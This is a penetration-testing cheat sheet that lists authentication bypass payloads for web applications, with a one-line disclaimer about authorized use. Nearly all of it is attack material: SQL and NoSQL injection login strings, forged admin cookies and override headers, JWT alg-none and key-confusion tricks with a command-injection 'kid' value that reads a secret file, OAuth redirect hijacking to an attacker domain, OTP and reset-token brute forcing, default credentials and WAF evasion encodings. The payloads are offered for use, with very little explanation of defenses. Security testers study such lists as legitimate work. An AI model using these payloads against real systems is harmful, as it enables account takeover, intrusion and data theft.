# Authentication Bypass Payloads

This document lists practical, field-tested payloads and techniques to bypass authentication in web applications. Use responsibly in authorized assessments only.

Legend:
- [!] High-impact or commonly successful
- [R] Requires Repeater/Intruder tuning
- [C] Context-dependent (framework/DB-specific)

## 1) SQL Injection Login Bypass

User/Password field payloads:
- [!] ' OR '1'='1 -- -
- [!] " OR "1"="1" -- -
- [!] admin' -- -
- [C] ' OR 1=1#
- [C] ' OR 1=1/*
- [C] ') OR '1'='1' -- -
- [C] ') OR 1=1 -- -
- [C] ' OR SLEEP(3)-- -   (time-based)

JSON body injection (NoSQL/ORM-affected apps):
- {"username": {"$ne": null}, "password": {"$ne": null}}
- {"username": {"$gt": ""}, "password": {"$gt": ""}}
- {"$where": "return true"}

HTTP parameter pollution (HPP):
- username=admin&username=ignored&password=anything
- login=1&login=0 (framework picks first/last)

## 2) Bypass via Parameter/Flag Manipulation

Headers/cookies/params to toggle:
- Cookie: authenticated=true; role=admin
- X-Original-URL: /admin
- X-Rewrite-URL: /admin
- X-HTTP-Method-Override: GET/POST
- X-Forwarded-Host/X-Forwarded-Proto manipulation for SSO callbacks
- Query: ?admin=true or ?isLoggedIn=1

Common weak client flags:
- is_admin=1, role=admin, premium=true, mfa_passed=true

## 3) Forced Browsing / Unprotected Endpoints

Try direct access (no auth headers):
- /admin, /dashboard, /internal, /manage, /settings
- /api/v1/users, /api/v1/admin, /api/v1/reports
- /export, /download, /backup.zip, /.git/, /.env

Automate with:
- ffuf -u https://target/FUZZ -w common_dirs.txt -mc all -fc 401,403

## 4) Verb/Method Confusion

- Send POST body with GET to bypass auth filters
- Try uncommon verbs: HEAD, OPTIONS, TRACE, PATCH
- Override with: X-HTTP-Method-Override: PUT/DELETE
- GWT/GraphQL endpoints often accept OPTIONS unauthenticated

## 5) Weak/Misused JWT

Header tampering:
- [!] {"alg":"none"} (if none accepted)
- [!] RS256 -> HS256 confusion; sign with public key
- kid traversal/injection:
  - "kid":"../../../../dev/null"
  - "kid":"; cat /app/secret"

Claim tampering:
- "admin": true, "role":"admin"
- "exp": far future
- "aud","iss" spoof to accepted values

## 6) OAuth/OpenID/SAML Tricks

- Manipulate redirect_uri to attacker domain (open redirect prerequisite)
- scope=openid email profile (overbroad scopes)
- Replace code with code from another client if validation weak
- Replay id_token where nonce check is missing
- Use http instead of https if allowed by provider validation

## 7) MFA Bypass

- Toggle client flag mfa_required=false in responses
- Reuse last valid OTP within grace window
- Request many OTPs to cause drift; try older codes
- Use backup codes guessing: 000000, 111111, 123456, 654321

## 8) Password Reset/Account Recovery Abuse

- Token brute-force: short tokens (6-8 chars alnum)
- Null/empty token acceptance
- Host header poisoning to receive token at attacker domain
- Reuse token after password reset (missing invalidation)

Wordlists to try for short tokens:
- crunch 6 6 0123456789 | parallel curl ...
- seclists/Passwords/Default-Credentials/

## 9) Default/Weak Credentials

- admin/admin, admin/password, root/root, test/test, guest/guest
- app/app, user/user, administrator/admin123, support/support
- Vendor defaults (Tomcat, Jenkins, phpMyAdmin, RabbitMQ)

## 10) Session Fixation/Prediction

- Provide JSESSIONID before login and check reuse after auth
- Inspect Set-Cookie flags: HttpOnly, Secure, SameSite
- Predictable tokens (sequential, timestamp-based)

## 11) CSRF-Assisted Login Bypass

- Login CSRF to make victim authenticate attacker-controlled account
- Change password via CSRF when old password not required

## 12) Caching and CDN Issues

- Cache poisoning: set Cache-Control: public for /admin
- Vary header misuse leading to cached authenticated pages

## 13) WAF/Ratelimit Bypass Techniques

- IP rotation: X-Forwarded-For spoofing, Tor, proxies
- Case/encoding tricks:
  - /AdMiN, /admin%2f, /..;/admin, /%252e%252e%253b/admin
- Payload obfuscation: comments, case, wide chars

## 14) GraphQL Specific

- Introspection to list auth-free mutations: {"query":"{__schema{types{name}}}"}
- Over-permissive directives: @skip(if:true) @include(if:false)
- Bypass with GET to /graphql?query=mutation... when POST blocked

## 15) Mobile/API Specific

- Bypass cert pinning (Frida, objection) and inspect tokens
- Replay refresh_token at token endpoint if rotation missing
- Try device_id spoof to unlock trusted device flows

## Checklists

Minimum quick pass:
- Try ' OR '1'='1 -- - on username
- Direct browse to /admin and /api/v1/*
- Toggle role/admin cookie and resend request
- Try JWT alg none and RS256->HS256
- Edit redirect_uri to attacker site during OAuth
- Attempt password reset token reuse
- Try method override and OPTIONS/HEAD access

## References
- OWASP Testing Guide: Authentication Testing
- PortSwigger Academy: Authentication vulnerabilities
- RFC 7519 (JWT)
- OAuth 2.0 Security BCP
